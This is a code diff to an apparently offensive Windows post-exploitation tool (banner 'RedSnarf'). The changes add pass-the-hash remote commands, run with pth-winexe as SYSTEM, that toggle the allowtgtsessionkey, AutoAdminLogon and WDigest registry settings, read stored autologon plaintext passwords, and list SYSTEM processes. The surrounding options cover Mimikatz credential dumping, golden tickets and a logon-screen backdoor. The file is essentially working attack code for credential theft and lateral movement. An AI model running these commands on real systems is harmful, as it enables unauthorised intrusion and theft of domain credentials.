@@ -46,7 +46,7 @@ events_logs = ["application","security","setup","system"]
 
 def banner():
 	print """
-   ______           .____________                     _____  
+    ______           .____________                     _____  
 \______   \ ____   __| _/   _____/ ____ _____ ________/ ____\ 
  |       _// __ \ / __ |\_____  \ /    \\__  \\_  __ \   __\  
  |    |   \  ___// /_/ |/        \   |  \/ __ \|  | \/|  |    
@@ -1005,13 +1005,13 @@ p.add_argument("-hL", "--lsass_dump", dest="lsass_dump", default="n", help="<Opt
 p.add_argument("-hM", "--massmimi_dump", dest="massmimi_dump", default="n", help="<Optional> Mimikatz Dump Credentaisl from the remote machine(s)")
 p.add_argument("-hR", "--stealth_mimi", dest="stealth_mimi", default="n", help="<Optional> stealth version of mass-mimikatz")
 p.add_argument("-hT", "--golden_ticket", dest="golden_ticket", default="n", help="<Optional> Create a Golden Ticket")
-
 # Enumeration related
 p.add_argument("-eA", "--service_accounts", dest="service_accounts", default="n", help="<Optional> Enum service accounts, if any")
 p.add_argument("-eL", "--find_user", dest="find_user", default="n", help="<Optional> Find user - Live")
 p.add_argument("-eO", "--ofind_user", dest="ofind_user", default="n", help="<Optional> Find user - Offline")
 p.add_argument("-eP", "--password_policy", dest="password_policy", default="n", help="<Optional> Display Password Policy")
 p.add_argument('--protocols', nargs='*', help=str(SAMRDump.KNOWN_PROTOCOLS.keys()))
+p.add_argument("-eT", "--system_tasklist", dest="system_tasklist", default="n", help="<Optional> Display NT AUTHORITY\SYSTEM Tasklist")
 # Registry related
 p.add_argument("-rL", "--lat", dest="lat", default="n", help="<Optional> Write batch file for turning on/off Local Account Token Filter Policy")
 p.add_argument("-rR", "--edq_rdp", dest="edq_rdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP Status")
@@ -1020,6 +1020,8 @@ p.add_argument("-rT", "--edq_trdp", dest="edq_trdp", default="n", help="<Optiona
 p.add_argument("-rW", "--edq_wdigest", dest="edq_wdigest", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Wdigest UseLogonCredential Registry Setting")
 p.add_argument("-rB", "--edq_backdoor", dest="edq_backdoor", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Backdoor Registry Setting - Left Alt + Left Shift + Print Screen at Logon Screen")
 p.add_argument("-rU", "--edq_uac", dest="edq_uac", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery UAC Registry Setting")
+p.add_argument("-rA", "--edq_autologon", dest="edq_autologon", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery AutoLogon Registry Setting")
+p.add_argument("-rS", "--edq_allowtgtsessionkey", dest="edq_allowtgtsessionkey", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery allowtgtsessionkey Registry Setting")
 
 args = p.parse_args()
 
@@ -1058,6 +1060,9 @@ edq_uac=args.edq_uac
 stealth_mimi=args.stealth_mimi
 mimikittenz=args.mimikittenz
 golden_ticket=args.golden_ticket
+edq_autologon=args.edq_autologon
+edq_allowtgtsessionkey=args.edq_allowtgtsessionkey
+system_tasklist=args.system_tasklist
 
 if lat in yesanswers:
 	WriteLAT()
@@ -1136,7 +1141,6 @@ if golden_ticket in yesanswers:
 						print colored(kNTHASH,'yellow')
 						break					
 			
-
 			if len(kNTHASH)>0:
 				#Get the SID Information
 				proc = subprocess.Popen("pth-rpcclient -U "+user+"%"+passw+" "+ targets[0]+" -c \"lookupnames krbtgt\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
@@ -1183,8 +1187,7 @@ if golden_ticket in yesanswers:
 
 if password_policy in yesanswers:
 	if len(targets)==1:
-		try:
-			
+		try:			
 			if args.protocols:
 				dumper = SAMRDump(args.protocols, args.username, args.password)
 			else:
@@ -1202,6 +1205,101 @@ if password_policy in yesanswers:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+if edq_allowtgtsessionkey!='n':
+	if len(targets)==1:
+		try:
+			if edq_allowtgtsessionkey=='e':
+				print colored("\n[+]IMPORTANT - Leave allowtgtsessionkey in the state that you found it\n\n",'red')
+
+				print colored("[+]Enabling allowtgtsessionkey:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+
+				print colored("[+]Querying the status of allowtgtsessionkey:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
+				sys.exit()	
+
+			elif edq_allowtgtsessionkey=='d':
+				print colored("\n[+]IMPORTANT - Leave allowtgtsessionkey in the state that you found it\n\n",'red')
+				
+				print colored("[+]Disabling allowtgtsessionkey:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+
+				print colored("[+]Querying the status of allowtgtsessionkey:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+
+				sys.exit()	
+	
+			elif edq_allowtgtsessionkey=='q':
+				print colored("[+]Querying the status of allowtgtsessionkey:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
+				sys.exit()	
+		except OSError:
+				print colored("[-]Something went wrong...",'red')
+				sys.exit()	
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
+
+if edq_autologon!='n':
+	if len(targets)==1:
+		try:
+			if edq_autologon=='e':
+				print colored("\n[+]IMPORTANT - Leave AutoLogon in the state that you found it\n\n",'red')
+
+				print colored("[+]Enabling AutoLogon:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+
+				print colored("[+]Querying the status of AutoLogon:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
+				sys.exit()	
+
+			elif edq_autologon=='d':
+				print colored("\n[+]IMPORTANT - Leave AutoLogon in the state that you found it\n\n",'red')
+				
+				print colored("[+]Disabling AutoLogon:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+
+				print colored("[+]Querying the status of AutoLogon:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+
+				sys.exit()	
+	
+			elif edq_autologon=='q':
+				print colored("[+]Querying the status of AutoLogon:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
+				print colored("[+]Querying the status of Default Username:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultUserName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
+				print colored("[+]Querying the status of Default Password:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultPassword\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
+				print colored("[+]Querying the status of Default Domain:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultDomainName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
+				sys.exit()	
+		except OSError:
+				print colored("[-]Something went wrong...",'red')
+				sys.exit()	
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
 
 if edq_wdigest!='n':
 	if len(targets)==1:
@@ -1210,28 +1308,33 @@ if edq_wdigest!='n':
 				print colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling Wdigest:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 0' 2>/dev/null")
-
-				print colored("[+]Querying the status of NLA:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null")
-
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
+				print colored("[+]Querying the status of Wdigest:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
 				sys.exit()	
 
 			elif edq_wdigest=='d':
 				print colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red')
 				
 				print colored("[+]Disabling Wdigest:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 1' 2>/dev/null")
-
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
 				print colored("[+]Querying the status of Wdigest:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null")
-
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
 				sys.exit()	
 	
 			elif edq_wdigest=='q':
 				print colored("[+]Querying the status of Wdigest:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null")
-
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
 				sys.exit()	
 		except OSError:
 				print colored("[-]Something went wrong...",'red')
@@ -1581,6 +1684,19 @@ if policiesscripts_dump=='y' or policiesscripts_dump=='yes':
 			sys.exit()
 	else:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
+
+if system_tasklist in yesanswers:
+	if len(targets)==1:
+		try:
+			print colored ('\n[+] Getting NT AUTHORITY\SYSTEM Tasklist on '+targets[0]+'\n','yellow')
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd.exe /C TASKLIST /FI \"USERNAME ne NT AUTHORITY\SYSTEM\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			print proc.communicate()[0]			
+			sys.exit()
+		except:
+			sys.exit()
+	else:
+		print colored ('\n[-]It is only possible to drop a shell on a single target and not a range','red')
 		sys.exit()
 
 if dropshell in yesanswers:
